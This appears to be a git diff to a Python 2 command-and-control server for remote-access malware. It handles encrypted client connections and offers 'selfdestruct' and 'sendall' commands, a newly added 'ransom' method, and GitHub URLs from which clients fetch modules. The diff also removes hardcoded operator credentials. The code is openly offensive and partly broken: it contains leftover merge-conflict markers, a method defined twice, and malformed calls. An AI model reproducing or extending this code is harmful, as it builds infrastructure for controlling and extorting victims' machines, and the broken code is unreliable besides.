@@ -39,11 +39,10 @@ encrypt/decrypt       | 128-bit AES encryption + HMAC-SHA256 authentication
 class Server(threading.Thread):
     def __init__(self, port):
         super(Server, self).__init__()
-        self.auth           = {'username':'helloFBI', 'password':'vega6812'}
+        self.auth           = {'username':raw_input('Username: '), 'password':raw_input('Password: ')}
         self.username       = '5881a198c709e551df7dd123963a98ea752e72362a56d5302ea606e031acdc64'
         self.password       = '03442b2ec33d7d49e885f9764f9015d4fad562a90daac0f95497d8e27b4b8347'
         self.validate       = sys.exit(0) if [SHA256.new(self.auth.get('username')).hexdigest() == self.username, SHA256.new(self.auth.get('password')).hexdigest() == self.password].count(True) != 2 else True
-        self.cond           = threading.Condition()
         self.clients        = dict({})
         self.client_count   = 1
         self.current_client = None
@@ -56,7 +55,6 @@ class Server(threading.Thread):
                                'selfdestruct'   :   self.selfdestruct_client,
                                'sendall'        :   self.send_to_all
                               }
-
         self.s                  = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         self.s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
         self.s.bind(('0.0.0.0', port))
@@ -118,11 +116,7 @@ class Server(threading.Thread):
         return unhexlify(str().join(block[n] for n in p))
 
     def run(self):
-<<<<<<< HEAD
-        while True:
-=======
 	while True:
->>>>>>> b50a2f7f128ec872184af657ee406d263fc94580
             conn, addr = self.s.accept()
             client_id = self.client_count
             client = Client(conn, addr, client_id)
@@ -130,6 +124,7 @@ class Server(threading.Thread):
             print '\n\nClient [{}] has connected'.format(str(self.client_count)) + ' from {}\n'.format(client.addr)
             self.client_count += 1
             self.select_client(client_id)
+            client.start()
 
     def select_client(self, client_id):
         try:
@@ -211,6 +206,7 @@ class Client(threading.Thread):
         self.dhkey      = self.diffiehellman()
         self.mac        = bytes()
         self.registered = bool()
+        self.urls       = {'repos':'https://api.github.com/repos/colental/AngryEggplant/contents','modules':'https://api.github.com/repos/colental/AngryEggplant/git/blobs/af458159e8156c412e3fe9ed025a1fed69987a1f','downloads':'https://raw.githubusercontent.com/colental/AngryEggplant/master/modules/%s','resources':'https://raw.githubusercontent.com/colental/AngryEggplant/master/resources/%s'}
         self.current    = lambda:bool(server.current_client.uid == self.uid)
         self.mysql      = lambda:mysql.connector.connect(host=raw_input("MySQL Host: ", user=raw_input("MySQL User: "), password=raw_input("MySQL Password: "), database=raw_input("MySQL Database: "))
 
@@ -256,55 +252,65 @@ class Client(threading.Thread):
     def sender(self, data):
         self.conn.sendall(self.encrypt(data))
 
-    def register(self, info):
+    def query(self, sql):
         db  = self.mysql()
         cursor  = db.cursor()
         try:
-            cursor.execute(info)
+            cursor.execute(sql)
             return True
         except Exception as e:
-            print "Registration error: {}".format(str(e))
+            print "MySQL registration error: {}".format(str(e))
             return False
 
-    def query(self, data):
-        db = self.mysql()
-        cursor = db.cursor()
+    def query(self, sql):
+        db  = self.mysql()
+        cursor  = db.cursor()
         try:
-            cursor.execute(data)
-        except Exception as xep:
-            return 'Query returned error: {}'.format(str(xep))
-        if data.startswith('INSERT'):
-            return 'Query executed successfully'
-        else:
-            try:
-                return "\n".join([i for i in cursor.fetchall()])
-            except:
-                return'Query returned no output'
+            cursor.execute(sql)
+        except Exception as e:
+            print "MySQL ransom error: {}".format(str(e))
+                                                         
+    def request(self, data):
+        try:
+            output = self.urls.get(data) if data in self.urls else None
+            if not output:
+                print "Client request '%s' was not found" % str(data)
+            return self.sender(output)
+        except Exception as e0:
+            print "Client request '%s' returned error: %s" % str(e0)
 
     def run(self):
         while True:
             cmd_buffer = ""
+
             while "\n" not in cmd_buffer:
-                cmd_buffer += self.conn.recv(4096)
-            method, _, data = cmd_buffer.partition(':')
-            client_data = self.decrypt(data)
-            if 'prompt' in method:
-<<<<<<< HEAD
-                client_buffer = client_data.format(self.uid)
-                print client_buffer,
-                client_buffer += raw_input('')
-=======
-		client_buffer = ""
-                print client_data.format(self.uid),
->>>>>>> b50a2f7f128ec872184af657ee406d263fc94580
-                client_buffer += "\n"
-                self.sender(client_buffer)
-            else:
-                if 'register' in method:
-                    self.registered = self.register(client_data)
-                elif 'mac' in method:
-                    self.mac = client_data
-                print client_data
+                try:
+                    cmd_buffer += self.conn.recv(4096)
+                except: pass
+
+            if len(cmd_buffer):
+
+                method, _, data = cmd_buffer.partition(':')
+                client_data = self.decrypt(data)
+                                                         
+                if 'prompt' in method:
+                    client_buffer = client_data.format(self.uid)
+                    print client_data.format(self.uid),
+                    client_buffer += raw_input('')
+                    client_buffer += "\n"
+                    self.sender(client_buffer)
+                                                         
+                else:
+                    if 'register' in method:
+                        self.registered = self.query(client_data)
+                    elif 'mac' in method:
+                        self.mac = client_data
+                    elif 'request' in method:
+                        request  = self.request(client_data)
+                    elif 'ransom' in method:
+                        ransom = self.query
+                        
+                    print client_data
 
 
 def get_parser():
